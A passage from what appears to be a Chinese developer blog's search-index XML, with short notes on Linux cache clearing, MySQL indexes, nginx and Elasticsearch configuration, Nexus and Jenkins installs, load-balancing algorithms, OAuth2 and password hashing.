$list 超时&quot; &quot;http://127.0.0.1/sms/&quot;else echo &quot;$list is connect ok!&quot;fidone {———-} 同目录下 建立 weblist.txt 12http:www.wuxinvip.comhttps://www.wuxinvip.com]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 清空缓存]]></title>
    <url>%2F2018%2F05%2F30%2Fshell%2Fshell-3%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021 确认缓存或不用内存free -mvi drop_caches.sh#页面缓存echo 1 &gt; /proc/sys/vm/drop_caches#目录缓存和inodesecho 2 &gt; /proc/sys/vm/drop_caches#页面缓存，目录缓存和inodesecho 3 &gt; /proc/sys/vm/drop_caches#清理文件系统缓存syncsave sh drop_caches.sh {———-} 注意: 上述所有命令都对系统无害，且只会有助于释放不用的内存。 而且sync还会清理僵尸(zombie)对象和它们占用的内存。 但是，如果你执行这些命令时正在写数据，你实际上在数据到达磁盘之前就将它从文件缓存中清除掉了, 这可能会造成很不好的影响。 所以，为了避免这种事情发生，你可以echo值到/proc/sys/vm/vfs_cache_pressure中， 告诉内核，当清理inoe/dentry缓存时应该用什么样的优先级。 LinuxInSight对值的范围解释得很清楚: vfs_cache_pressure=100是默认值，内核会尝试重新声明dentries和inodes， 并采用一种相对于页面缓存和交换缓存比较”合理”的比例。 减少vfs_cache_pressure会导致内核倾向于保留dentry和inode缓存。 而增加vfs_cache_pressure超过100时，则会导致内核倾向于重新声明dentries和inodes 简而言之，小于100的值不会导致缓存的大量减少。超过100的值则会告诉内核你希望以高优先级来清理缓存。其实，无论你采用什么值，内核清理缓存的速度都是比较低的。如果将此值设置为10000，系统将会将缓存减少到一个合理的水平。]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql 索引]]></title>
    <url>%2F2018%2F05%2F30%2Fmysql%2Fmysql-indexes%2F</url>
    <content type="text"><![CDATA[mysql 索引 1234567891011121314151617181920212223242526单列索引1、普通索引--允许null和重复--优点就是查询快2、唯一索引--允许null 但是不可重复3、主键索引--不允许null 不可重复组合索引1、联合索引【组合索引】 多个字段创建一个索引健、只有最左边的索引被用到 联合索引才能被用到 索引最多包含16列全文索引1、全文索引 MyISAM 引擎独有 只能用在 char varchar text使用 检索文字关键字空间索引1、空间索引 针对空间数据类型的字段所建立的索引 MyISAM 引擎独有 空间引擎所在列 not null 支持数据类型 geometry、point、linestring、polygon 创建索引使用 spatial 关键字 纠正： MyISAM并InnoDB 支持空间类型的R-tree索引。 其他存储引擎使用B树来索引空间类型（除了 ARCHIVE不支持空间类型索引）。 所有的索引 必须合适业务使用在创建 对于更新频繁 检索较少的不得加除了主键索引之外的任何索引 徒增insert 和 update delete 消耗 {———-} B树和散列索引的比较 了解B树和散列数据结构可以帮助预测不同的查询在使用索引中的这些数据结构的不同存储引擎上的性能。 特别是用于MEMORY允许您选择B树或散列索引的存储引擎。 B树 区分大小 【小于 大于 大于等于 小于等于】 hash树 确定值【等于】 检索索引是否有效 explain]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么你成不了架构师]]></title>
    <url>%2F2018%2F05%2F30%2Fessay%2Fessay-8%2F</url>
    <content type="text"><![CDATA[近期入职新公司 接手架构重构 感慨颇多、也学到不少东西、学会了时间不使用timestamp 使用bigint、价格不使用decimal 而是int or bigint以前常念叨 适合业务的技术才是最好的技术、却少有感慨 为什么使用bigint作为时间单位？1231、首先兼容oracle、其次项目内部流转不容易异常【项目中是这个说法、貌似timestamp我也没碰到过异常】&lt;br&gt;2、还有就是int值比较容易比较 尤其针对范围查询 较快些吧、估计timestamp底层比较就是int方式 {———-} 为什么使用int或者bigint作为价格单位 1、首先这点不能一定就说项目中就一定是对的、暂时没有想到以前的设计方案项目中的想法了解到、价格小数点取到后四位 1.0001元、2、当然decimal肯定可以甚至可以更好的decimal（10，5）这样的设计我觉得会更好事实上现在也出现了问题 总价格不能超过2100000.00000【int的最大值】 系统重构是痛苦的、后续任务中涉及表重构、需要设计索引、以前曾经擅自在项目表设计上加过联合索引、被领导小训了一顿、从此对之是挺害怕的、甚至到之前一直都不知道为什么错了、知识水平有限 回家路上是左思右想、有了这么几个猜测12345671、使用explian table查询表索引 联合索引两个字段有一个被索引另一个没有索引2、联合索引、更新表要更新索引缓存、而实际查询率并不高、 也就是说花费了巨大的代价去维护一个索引健、而用到的时候却比较少3、我擅自增加索引的表是用户表、用户表更新比较频繁、查询较少、 进一步增大了【2】的代价去干了不该干的事、4、一系列的骚操作、不知道底层就瞎搞胡搞、须知所有的设计都是有利有弊、 都是为了某些业务场景而设计、把不该用的配置用到不该用的业务上、就会与期望值南辕北辙 为什么你成不了架构师？ 每一个系统都有自己的业务需求、天下没有两片一样的叶子、也没有两个一样的系统、 即使业务需求一样、不同的程序员也会设计出不同的系统12345678910都在讲架构师要有两方面准备【技术架构】和【业务架构】技术架构：从最简单的LAMP【linux+apache tomcat+mysql+php】到SOA、 到微服务、以及各个组件的针对场景使用业务架构：这个是选择来的、不同的公司在做不同的业务、没有业务架构知识、 你连一个表都设计不出来、不了解业务面对老系统设计都不敢动、还谈什么架构？就像 我为什么在这使用中文：而不是英文: 因为中文间距宽 更易读、而使用英文 间距小 不容易读 只去关注技术的优缺点、永远成不了架构师、只有了解系统的特点、才能更好的设计出一个优秀的系统、又快又稳定。]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git error]]></title>
    <url>%2F2018%2F05%2F28%2Fessay%2Fgit-email%2F</url>
    <content type="text"><![CDATA[123git config --system --unset credential.helper之后重新配置 user.name user.email 123456git 提交错误The Git process exited with the code -1,073,741,819版本问题http://download.csdn.net/detail/huoyan403/9874429]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[base-cloud]]></title>
    <url>%2F2018%2F05%2F27%2Fspring-cloud%2Fbase-cloud%2F</url>
    <content type="text"><![CDATA[他屌任他屌、我吃他大鸟 他皮任他皮、把他当瓜皮 代码地址gitee代码地址github develop 分支【使用gradle开发、属于开发比较良好的版本】 {———-}]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>开源项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nexus部署]]></title>
    <url>%2F2018%2F05%2F26%2Fservice-deploy%2Fnexus%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334基本环境jdk8maven3.Xcurl -L -O https://sonatype-download.global.ssl.fastly.net/repository/repositoryManager/3/nexus-3.12.0-01-unix.tar.gztar zxvf nexus-3.9.0-01-unix.tar.gzmv nexus-3.9.0-01 /opt/env/nexus#修改端口vi nexus-default.properties#添加一个用户useradd -r nexus#切换用户su nexuscd /opt/env/nexus/bin./nexus start启动较慢su rootlsof -i:9000#java 7401 root 843u IPv4 106307 0t0 TCP pek1-vm-02:cslistener-&gt;10.1.5.154:54703 (ESTABLISHED)#java 7401 root 851u IPv4 91614 0t0 TCP *:cslistener (LISTEN)如果有以上两个进程成功]]></content>
      <categories>
        <category>java</category>
        <category>service-deploy</category>
      </categories>
      <tags>
        <tag>服务搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jenkins部署]]></title>
    <url>%2F2018%2F05%2F26%2Fservice-deploy%2Fjenkins%2F</url>
    <content type="text"><![CDATA[jenkins官网 123456789基本环境jdk8curl -L -O https://prodjenkinsreleases.blob.core.windows.net/redhat-stable/jenkins-2.121.1-1.1.noarch.rpmrpm -ivh jenkins-2.121.1-1.1.noarch.rpm]]></content>
      <categories>
        <category>java</category>
        <category>service-deploy</category>
      </categories>
      <tags>
        <tag>服务搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch-bean-setting]]></title>
    <url>%2F2018%2F05%2F24%2Fsearch-engine%2Felasticsearch-bean-setting%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#分片数index.number_of_shards#副本数index.number_of_replicas#是否设为影子副本（暂未研究）index.shadow_replicas#是否设为可分享文件系统（暂未研究）index.shard_filesystem#是否自动扩展副本（暂未研究）index.auto_expand_replicas#暂未研究index.blocks.read_only#暂未研究index.blocks.read#暂未研究index.blocks.write#暂未研究index.blocks.metadata#创建该index用到的Elasticsearch版本index.version.createdindex.version.created_string#更新该index用到的Elasticsearch版本index.verison.upgradedindex.version.upgraded_string#该index支持的最小lucene版本index.version.minimum_compatible#该index建立日期index.creating_dataindex.creating_data_string#该index的优先级index.priority#该index的uuid，唯一标识index.uuid#该index各索引的routing规则，采用何种Hash方式，默认使用Murmur3，还有一种普通的Hash算法index.legacy.routing.hash.type#routing计算是否使用type，内部计算shard id的方法已经废弃，建议不使用，不设置，默认false即可index.legacy.routing.use_type#该index的数据存储路径index.data_path#暂未研究#index.shared_filesystem.recover_on_any_node]]></content>
      <categories>
        <category>java</category>
        <category>search-engine</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring-data-es源码]]></title>
    <url>%2F2018%2F05%2F24%2Fspring-cloud%2Fspring-data-es-1%2F</url>
    <content type="text"><![CDATA[{———-} 12345678910spring-data-common 对接口进行了定义spring-data-es 对服务进行实现 封装es客户端学到的更多的是代码的书写吧各种服务封装学会了自己封装一个服务给业务部门调用]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch-xmind]]></title>
    <url>%2F2018%2F05%2F24%2Fsearch-engine%2Felasticsearch-xmind%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>java</category>
        <category>search-engine</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nutch简介]]></title>
    <url>%2F2018%2F05%2F24%2Fsearch-engine%2Fnutch-1%2F</url>
    <content type="text"><![CDATA[简介发展]]></content>
      <categories>
        <category>java</category>
        <category>search-engine</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EUREKA配置]]></title>
    <url>%2F2018%2F05%2F24%2Fspring-cloud%2Feureka-2%2F</url>
    <content type="text"><![CDATA[配置 配置参数 默认值 说明 服务注册中心配置 Bean类：org.springframework.cloud.netflix.eureka.server.EurekaServerConfigBean eureka.server.enable-self-preservation false 关闭注册中心的保护机制，Eureka 会统计15分钟之内心跳失败的比例低于85%将会触发保护机制，不剔除服务提供者，如果关闭服务注册中心将不可用的实例正确剔除 服务实例类配置 Bean类：org.springframework.cloud.netflix.eureka.EurekaInstanceConfigBean eureka.instance.prefer-ip-address false 不使用主机名来定义注册中心的地址，而使用IP地址的形式，如果设置了eureka.instance.ip-address 属性，则使用该属性配置的IP，否则自动获取除环路IP外的第一个IP地址 eureka.instance.ip-address IP地址 eureka.instance.hostname 设置当前实例的主机名称 eureka.instance.appname 服务名，默认取 spring.application.name 配置值，如果没有则为 unknown eureka.instance.lease-renewal-interval-in-seconds 30 定义服务续约任务（心跳）的调用间隔，单位：秒 eureka.instance.lease-expiration-duration-in-seconds 90 定义服务失效的时间，单位：秒 eureka.instance.status-page-url-path /info 状态页面的URL，相对路径，默认使用 HTTP 访问，如果需要使用 HTTPS则需要使用绝对路径配置 eureka.instance.status-page-url 状态页面的URL，绝对路径 eureka.instance.health-check-url-path /health 健康检查页面的URL，相对路径，默认使用 HTTP 访问，如果需要使用 HTTPS则需要使用绝对路径配置 eureka.instance.health-check-url 健康检查页面的URL，绝对路径 服务注册类配置 Bean类：org.springframework.cloud.netflix.eureka.EurekaClientConfigBean eureka.client.service-url. 指定服务注册中心地址，类型为 HashMap，并设置有一组默认值，默认的Key为 defaultZone；默认的Value为 http://localhost:8761/eureka ，如果服务注册中心为高可用集群时，多个注册中心地址以逗号分隔。如果服务注册中心加入了安全验证，这里配置的地址格式为：http://:@localhost:8761/eureka 其中 为安全校验的用户名； 为该用户的密码 eureka.client.fetch-registery true 检索服务 eureka.client.registery-fetch-interval-seconds 30 从Eureka服务器端获取注册信息的间隔时间，单位：秒 eureka.client.register-with-eureka true 启动服务注册 eureka.client.eureka-server-connect-timeout-seconds 5 连接 Eureka Server 的超时时间，单位：秒 eureka.client.eureka-server-read-timeout-seconds 8 读取 Eureka Server 信息的超时时间，单位：秒 eureka.client.filter-only-up-instances true 获取实例时是否过滤，只保留UP状态的实例 eureka.client.eureka-connection-idle-timeout-seconds 30 Eureka 服务端连接空闲关闭时间，单位：秒 eureka.client.eureka-server-total-connections 200 从Eureka 客户端到所有Eureka服务端的连接总数 eureka.client.eureka-server-total-connections-per-host 50 从Eureka客户端到每个Eureka服务主机的连接总数]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[负载均衡]]></title>
    <url>%2F2018%2F05%2F24%2Fload-balance%2Ftotal%2F</url>
    <content type="text"><![CDATA[负载均衡起源 将用户请求通过各种算法、均匀的分配到各个服务器上、以保证最大用户量的支撑、 同时服务实例又不会因为请求过载而gg 负载均衡工作模式 说起负载均衡工作模式就得从网络请求说起、因为他工作于用户到服务器的请求路径上 目前基本网络协议 http、【七层】 物理、数据链路、网络、应用层、等等、、、、 基于物理层的 就算是硬件负载均衡设备、在网卡端口上设置算法、均衡服务实例请求量 基于网络层的 一般较软件负载均衡设备 常用的 ：nginx 工作在 4和7层 既有网络层【端口监听】、也有应用层【端口转发】 负载均衡]]></content>
      <categories>
        <category>java</category>
        <category>load-balance</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[负载均衡算法]]></title>
    <url>%2F2018%2F05%2F23%2Fload-balance%2Falgorithm%2F</url>
    <content type="text"><![CDATA[LVS十种算法4种静态算法1、RR 依次轮调 2、WRR 加权轮调 3、DH 目标地址hash 4、SH 源地址hash {———-} 6种动态算法1、 LC least connection 最小调用 2、 WLC 加权重LC 3、 SED 对WLC补充、加一、让其能够比较大小 4、 NQ never queue 5、LBLC DH+LC 使用于cache群 6、LBLCR 带有复制功能的LBLC 常见负载均衡算法随机12345678910111213141516public static String random() &#123; //重新建立一个map,避免出现由于服务器上线和下线导致的并发问题 Map&lt;String,Integer&gt; serverMap = new HashMap&lt;String,Integer&gt;(); serverMap.putAll(serverWeigthMap); //获取ip列表list Set&lt;String&gt; keySet = serverMap.keySet(); ArrayList&lt;String&gt; keyList = new ArrayList&lt;String&gt;(); keyList.addAll(keySet); java.util.Random random = new java.util.Random(); int randomPos = random.nextInt(keyList.size()); String server = keyList.get(randomPos); return server; &#125; 加权随机123456789101112131415161718192021222324public static String weightRandom() &#123; //重新建立一个map,避免出现由于服务器上线和下线导致的并发问题 Map&lt;String,Integer&gt; serverMap = new HashMap&lt;String,Integer&gt;(); serverMap.putAll(serverWeigthMap); //获取ip列表list Set&lt;String&gt; keySet = serverMap.keySet(); Iterator&lt;String&gt; it = keySet.iterator(); List&lt;String&gt; serverList = new ArrayList&lt;String&gt;(); while (it.hasNext()) &#123; String server = it.next(); Integer weight = serverMap.get(server); for (int i = 0; i &lt; weight; i++) &#123; serverList.add(server); &#125; &#125; Random random = new Random(); int randomPos = random.nextInt(serverList.size()); String server = serverList.get(randomPos); return server; &#125; ipHash12345678910111213141516public static String ipHash(String remoteIp) &#123; //重新建立一个map 比买你出现由于服务器上线和下线导致的并发问题 Map&lt;String,Integer&gt; serverMap = new HashMap&lt;String,Integer&gt;(); serverMap.putAll(serverWeigthMap); //获取ip列表list Set&lt;String&gt; keySet = serverMap.keySet(); ArrayList&lt;String&gt; keyList = new ArrayList&lt;String&gt;(); keyList.addAll(keySet); int hashCode =remoteIp.hashCode(); int serverListSize = keyList.size(); int serverPos = hashCode % serverListSize; return keyList.get(serverPos); &#125; 最小调用…]]></content>
      <categories>
        <category>java</category>
        <category>load-balance</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx]]></title>
    <url>%2F2018%2F03%2F25%2Fload-balance%2Fnginx%2F</url>
    <content type="text"><![CDATA[原理 123一个主线程负责请求分发四个或者两个【可配置】子线程进行请求转发到端口 配置 支持并发量 {———-} 1好像是大约支持50000 Pv/s 常用命令 12345678910service nginx startservice nginx stopservice nginx restartnginx -t /etc/nginx/conf.d/www.confnginx -s reloadnet start nginx net stop nginx docker中使用 12345678docker pull nginxdocker nginx -t docker nginx -s reloaddocker service nginx start 转发配置123456789101112conf.d/upstream.confupstream demo&#123; server 127.0.0.1:8080 weight=1;&#125;default.d/location.conflocation /demo/&#123; http_proxy:http://demo;&#125; 多域名配置1234567891011121314test.confserver &#123; listen 80; server_name test.baidu.com; location / &#123; proxy_set_header Host $http_host; proxy_pass http://127.0.0.1:8082/uc/; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940配置好了看看服务器443端口有没有配置安全组 【mmp 吃了小亏】 server &#123; listen 80; server_name 39.107.82.228;#防攻击 return 502; &#125; server &#123; listen 80; server_name www.example.com; return 301 https://www.example.com$request_uri; location / &#123;# proxy_set_header Host $http_host;# proxy_pass http://ip:port;# or http://example 使用upstream 转发# proxy_redirect off;# proxy_set_header X-Real-IP $remote_addr;# proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; server &#123; listen 443; server_name www.example.com; ssl on; ssl_certificate &quot;/etc/nginx/cert/1526742087444.pem&quot;; ssl_certificate_key &quot;/etc/nginx/cert/1526742087444.key&quot;; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; location / &#123; proxy_set_header Host $http_host; proxy_pass http://ip:port/; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; 使用geoip 限制ip访问1234567891011121314151617181920212223242526272829geoip_country /usr/local/etc/geo/GeoIp.dat;http&#123; geoip_country /usr/local/etc/geo/GeoIp.dat; geo $exclusions&#123; 127.0.0.1 1; 216.239.32.0/19 1; &#125; server&#123; if($geoip_country_code = &quot;CH&quot;)&#123; set $exclusions 1; &#125; listen ..... &#125;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>load-balance</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OAuth OAuth2]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-permission%2Foauth-oauth2%2F</url>
    <content type="text"><![CDATA[翻了几篇子 认证 csdn 一个模样 连错误都一样 《用访问令牌到授权服务器换取访问令牌(accesstoken&amp;secret)》这叫人怎么理解 ？？ 果断找官网https://oauth.net/core/1.0a/ https://oauth.net/2/ {———-} 1234567891011121314151617181920212223242526OAuth2 授权类型1、运行在网络服务器，基于浏览器和移动应用程序的应用程序的授权码【web授权】2、密码为与登录用户名和密码3、客户端凭证的应用程序访问4、Implicit以前曾被推荐给没有秘密的客户，但已被使用授权代码授权而没有秘密取代。OAuth认证和授权的过程如下:1、用户访问第三方网站网站，想对用户存放在服务商的某些资源进行操作。2、第三方网站向服务商请求一个临时令牌。3、服务商验证第三方网站的身份后，授予一个临时令牌。4、第三方网站获得临时令牌后，将用户导向至服务商的授权页面请求用户授权，然后这个过程中将临时令牌和第三方网站的返回地址发送给服务商。5、用户在服务商的授权页面上输入自己的用户名和密码，授权第三方网站访问所相应的资源。6、授权成功后，服务商将用户导向第三方网站的返回地址。7、第三方网站根据临时令牌从服务商那里获取访问令牌。8、服务商根据令牌和用户的授权情况授予第三方网站访问令牌。9、第三方网站使用获取到的访问令牌访问存放在服务商的对应的用户资源。 国外文档：https://aaronparecki.com/oauth-2-simplified/ 看不懂的用有道翻译啊[捂脸笑][捂脸笑][捂脸笑] 巨详细的请求解释 看看国内的 mmp]]></content>
      <categories>
        <category>java</category>
        <category>service-permission</category>
      </categories>
      <tags>
        <tag>权限认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch内部存储执行机制]]></title>
    <url>%2F2018%2F03%2F24%2Fsearch-engine%2Felasticsearch-1%2F</url>
    <content type="text"><![CDATA[新建、索引和删除单个文档 以下是在主副分片和任何副本分片上面成功新建，索引和删除文档所需要的步骤顺序： 客户端向 Node 1 发送新建、索引或者删除请求。 节点使用文档的 _id 确定文档属于分片 0 。请求会被转发到 Node 3，因为分片 0 的主分片目前被分配在 Node 3 上。 Node 3 在主分片上面执行请求。如果成功了，它将请求并行转发到 Node 1 和 Node 2 的副本分片上。一旦所有的副本分片都报告成功, Node 3 将向协调节点报告成功，协调节点向客户端报告成功。 在客户端收到成功响应时，文档变更已经在主分片和所有副本分片执行完成，变更是安全的。 {———-} 取回单个文档 以下是从主分片或者副本分片检索文档的步骤顺序： 1、客户端向 Node 1 发送获取请求2、节点使用文档的 _id 来确定文档属于分片 0 。分片 0 的副本分片存在于所有的三个节点上。 在这种情况下，它将请求转发到 Node 23、Node 2 将文档返回给 Node 1 ，然后将文档返回给客户端。 在处理读取请求时，协调结点在每次请求的时候都会通过轮询所有的副本分片来达到负载均衡 局部更新文档 以下是部分更新一个文档的步骤： 客户端向 Node 1 发送更新请求。 它将请求转发到主分片所在的 Node 3 。 Node 3 从主分片检索文档，修改 _source 字段中的 JSON ，并且尝试重新索引主分片的文档。 如果文档已经被另一个进程修改，它会重试步骤 3 ，超过 retry_on_conflict 次后放弃。 如果 Node 3 成功地更新文档，它将新版本的文档并行转发到 Node 1 和 Node 2 上的副本分片，重新建立索引。 一旦所有副本分片都返回成功， Node 3 向协调节点也返回成功，协调节点向客户端返回成功。 update API 还接受在 新建、索引和删除文档 章节中介绍的 routing 、 replication 、 consistency 和 timeout 参数。 使用 mget 取回多个文档 以下是使用单个 mget 请求取回多个文档所需的步骤顺序： 客户端向 Node 1 发送 mget 请求。 Node 1 为每个分片构建多文档获取请求，然后并行转发这些请求到托管在每个所需的主分片或者副本分片的节点上。一旦收到所有答复， Node 1 构建响应并将其返回给客户端。 可以对 docs 数组中每个文档设置 routing 参数。 使用 bulk 修改多个文档 bulk API按如下步骤顺序执行： 客户端向 Node 1 发送 bulk 请求。 Node 1 为每个节点创建一个批量请求，并将这些请求并行转发到每个包含主分片的节点主机。 主分片一个接一个按顺序执行每个操作。当每个操作成功时，主分片并行转发新文档（或删除）到副本分片，然后执行下一个操作。 一旦所有的副本分片报告所有操作成功，该节点将向协调节点报告成功，协调节点将这些响应收集整理并返回给客户端。 bulk API 还可以在整个批量请求的最顶层使用 consistency 参数，以及在每个请求中的元数据中使用 routing 参数。]]></content>
      <categories>
        <category>java</category>
        <category>search-engine</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码加密方式]]></title>
    <url>%2F2018%2F03%2F24%2Fencryption%2Fpassword-develop%2F</url>
    <content type="text"><![CDATA[常见攻击方式：字典攻击：早期base64+md5 破解方式–把常见密码进行base63+md5加密 通过重复登陆服务器 或者拖库进行匹配破解【破解方式属于开放状态】 对称加密 加密解密效率高、速度快、空间占用小、加密强度高 缺点是 参与多方都需要持有密钥、一旦有一个人泄露则安全性遭到破坏、另外再不容安全通道下分发密钥也是个问题 代表算法：DES、3DES、AES、IDEA等等 DES：其密钥长度为56位+8位校验 破解方式：暴力破解 3DES：3重DES操作 算法不能靠累积增加防御力 AES：分组算法、分组长度为128、192、256位三种、其优势在于 速度快 整个过程可以数学化描述、目前尚未有效破解手段 适用于大量数据加解密、不能用于签名场景 需要提前分法密钥 {———-} 非对称加密 即公钥+私钥 公钥是公开的、私钥是个人持有的 代表算法：RSA、EIGamal、椭圆算法 ECC RSA：经典的公钥算法 安全性未知 EIGamal：利用了模运算下求离散对数困难的特性 椭圆曲线算法：现代备受关注的算法系列，基于对椭圆曲线上特定点进行特殊乘法逆运算难以计算的特性。 RSA 算法等已被认为不够安全，一般推荐采用椭圆曲线系列算法。 混合加密机制 先用计算复杂度高的非对称加密协商一个临时的对称加密密钥（会话密钥，一般相对内容来说要短得多），然后对方在通过对称加密对传递的大量数据进行加解密处理。 典型应用：现在大家常用的HTTPS机制、 HTTPS实际上是利用了Transport Layer Security/Secure Socket Layer（TLS/SSL）来实现可靠性传输、TLS为SSL升级版本 目前广泛应用的为 TLS1.0 对应到SSL3.1 版本 建立安全连接的具体步骤如下： 客户端浏览器发送信息到服务器，包括随机数 R1，支持的加密算法类型、协议版本、压缩算法等。注意该过程为明文。 服务端返回信息，包括随机数 R2、选定加密算法类型、协议版本，以及服务器证书。注意该过程为明文。 浏览器检查带有该网站公钥的证书。该证书需要由第三方 CA 来签发，浏览器和操作系统会预置权威 CA 的根证书。如果证书被篡改作假（中间人攻击），很容易通过 CA 的证书验证出来。 如果证书没问题，则用证书中公钥加密随机数 R3，发送给服务器。此时，只有客户端和服务器都拥有 R1、R2 和 R3 信息，基于 R1、R2 和 R3，生成对称的会话密钥（如 AES算法）。后续通信都通过对称加密进行保护。 最简单的哈希加密 例如SHA256，SHA512，RipeMD和WHIRLPOOL。 hash(“hello”) = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824 破解方式：字典攻击 、暴力攻击加密算法公开 将常见密码哈希之后与目标进行比对 暴力攻击尝试每一个在给定长度下各种字符的组合 彩虹表枚举哈希值-来更高效的破解密码 加盐方式 加盐需要注意两点：短盐值、盐值重复 两大弊端：盐值重复或者硬编到软件中、可以通过破解软件、专门为这个软件生成彩虹表和查询表 盐值太短：就相当于降低密码复杂度、这使得破解字典体积更小、跑字典破解更快 组合哈希函数 md5(sha1(password)) md5(md5(salt) + md5(password)) sha1(sha1(password)) sha1(str_rot13(password + salt)) md5(sha1(md5(md5(password) + sha1(password)) + md5(password))) 源码一丢、系统完蛋 盐值应该使用基于加密的伪随机数生成器（Cryptographically Secure Pseudo-Random Number Generator – CSPRNG）来生成java.security.SecureRandom 存储密码的步骤 使用CSPRNG生成一个长度足够的盐值 将盐值混入密码，并使用标准的加密哈希函数进行加密，如SHA256把哈希值和盐值一起存入数据库中对应此用户的那条记录 校验密码的步骤 从数据库取出用户的密码哈希值和对应盐值将盐值混入用户输入的密码，并且使用同样的哈希函数进行加密比较上一步的结果和数据库储存的哈希值是否相同，如果相同那么密码正确，反之密码错误 在Web程序中，永远在服务器端进行哈希加密 让密码更难破解：慢哈希函数 PBKDF2、BCRYPT、SCRYPT曾经是最常用的三种密码Hash算法， 至于哪种算法最好，多年以来密码学家们并无定论。但可以确定的是，这三种算法都不完美，各有缺点。 其中 PBKDF2因为计算过程需要内存少所以可被GPU/ASIC加速， BCRYPT不支持内存占用调整且容易被FPGA加速， SCRYPT不支持单独调整内存或计算时间占用且可能被ASIC加速并有被旁路攻击的可能。 关于密码学的另一篇文章http://www.qingruanit.net/blog/23930/note3641.html PBKDF2算法【三种】介绍： https://en.wikipedia.org/wiki/PBKDF2 http://blog.jobbole.com/61872/#java http://blog.csdn.net/u014375869/article/details/46773995]]></content>
      <categories>
        <category>java</category>
        <category>password</category>
      </categories>
      <tags>
        <tag>密码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch-config]]></title>
    <url>%2F2018%2F03%2F24%2Fsearch-engine%2Felasticsearch-config%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# ---------------------------------- Cluster -----------------------------------## 为群集使用描述性名称:##cluster.name: my-application## ------------------------------------ Node ------------------------------------##为节点使用描述性名称:##node.name: node-1## 向节点添加自定义属性:##node.attr.rack: r1## ----------------------------------- Paths ------------------------------------## 路径到目录存储数据的位置 (用逗号分隔多个位置):##path.data: /path/to/data## 日志文件的路径:##path.logs: /path/to/logs## ----------------------------------- Memory -----------------------------------## 启动时锁定内存:##bootstrap.memory_lock: true##确保堆大小设置为大约一半的可用内存在系统上, 并且允许进程的所有者使用此限制。## 当系统交换内存时, Elasticsearch 执行得很差。## ---------------------------------- Network -----------------------------------## 将绑定地址设置为特定 IP (IPv4 或 IPv6):##network.host: 192.168.0.1## 为 HTTP 设置自定义端口:##http.port: 9200## 有关详细信息, 请参阅网络模块文档。## --------------------------------- Discovery ----------------------------------## 在启动新节点时传递初始主机列表以执行发现:# 主机的默认列表为 [ &quot;127.0.0.1 &quot;, [:: 1] &quot;]##discovery. zen.ping.unicast.hosts: [ &quot;host1 &quot;, &quot;host2 &quot;]## 通过配置大多数节点 (主合格节点总数/2 + 1) 来防止 &quot;分裂大脑 &quot;:##discovery.zen.minimum_master_nodes:### ---------------------------------- Gateway -----------------------------------## 在完全群集重新启动后阻止初始恢复, 直到开始 N 个节点:##gateway.recover_after_nodes: 3### ---------------------------------- Various -----------------------------------## 删除索引时需要显式名称:##action.destructive_requires_name: true]]></content>
      <categories>
        <category>java</category>
        <category>search-engine</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
